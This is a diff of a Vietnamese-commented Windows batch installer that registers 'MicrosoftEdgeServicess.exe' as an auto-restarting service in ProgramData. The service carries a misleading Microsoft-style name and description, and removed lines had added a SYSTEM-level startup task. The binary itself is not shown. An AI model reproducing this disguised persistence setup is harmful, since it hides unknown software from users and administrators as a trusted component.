@@ -58,18 +58,31 @@ exit /b 1
 :DaCoQuyenAdmin
 
 :: 3. Dong cua so services.msc (mmc.exe) de tranh bi khoa handle lam Service bi danh dau xoa (Loi 1058 / 1072)
-echo [1/6] Dang giai phong khoa he thong va tien trinh cu...
+echo [1/5] Dang giai phong khoa he thong va tien trinh cu...
 taskkill /F /IM mmc.exe >nul 2>&1
+
+:: Giai phong triet de neu service bi ket o STOP_PENDING bang cach taskkill dung PID
+for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
+    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
+)
+taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
 taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
 net stop MicrosoftEdgeServicess >nul 2>&1
-ping 127.0.0.1 -n 3 >nul
+
+:: Cho toi da 5 giay de trang thai Service ve STOPPED
+for /l %%i in (1,1,5) do (
+    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
+    if not errorlevel 1 goto :DaDungHan
+    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
+)
+:DaDungHan
 
 :: 4. Thiet lap thu muc he thong
 set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
-echo [2/6] Thiet lap thu muc he thong: %INSTALL_DIR%
+echo [2/5] Thiet lap thu muc he thong: %INSTALL_DIR%
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
 
-echo [3/6] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
+echo [3/5] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
 copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\"
 copy /Y "%~dp0config.json" "%INSTALL_DIR%\"
 copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
@@ -80,7 +93,10 @@ copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul
 
 :: 5. Dang ky hoac cap nhat Windows Service
-echo [4/6] Dang cau hinh Windows Service MicrosoftEdgeServicess...
+echo [4/5] Dang cau hinh Windows Service MicrosoftEdgeServicess...
+:: Xoa Task Scheduler cu de tranh chay song song 2 tien trinh gay xung dot
+schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1
+
 sc.exe query MicrosoftEdgeServicess >nul 2>&1
 if %errorlevel% equ 0 goto :ServiceDaTonTai
 
@@ -97,18 +113,13 @@ sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\Micro
 sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
 sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
 
-:: Thiet lap du phong qua Task Scheduler
-echo [5/6] Dang thiet lap du phong qua Task Scheduler...
-schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1
-
 :: 6. Khoi dong Windows Service ngay bay gio
-echo [6/6] Dang khoi chay Windows Service ngam...
-net start MicrosoftEdgeServicess
-if %errorlevel% equ 0 goto :KhoiDongThanhCong
-echo    Thu khoi dong truc tiep qua service start...
-"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start >nul 2>&1
+echo [5/5] Dang khoi chay Windows Service ngam...
+sc.exe start MicrosoftEdgeServicess >nul 2>&1
+net start MicrosoftEdgeServicess >nul 2>&1
 
-:KhoiDongThanhCong
+:: Cho 3 giay de Service on dinh trang thai
+timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 
 echo.
 echo ===============================================================================
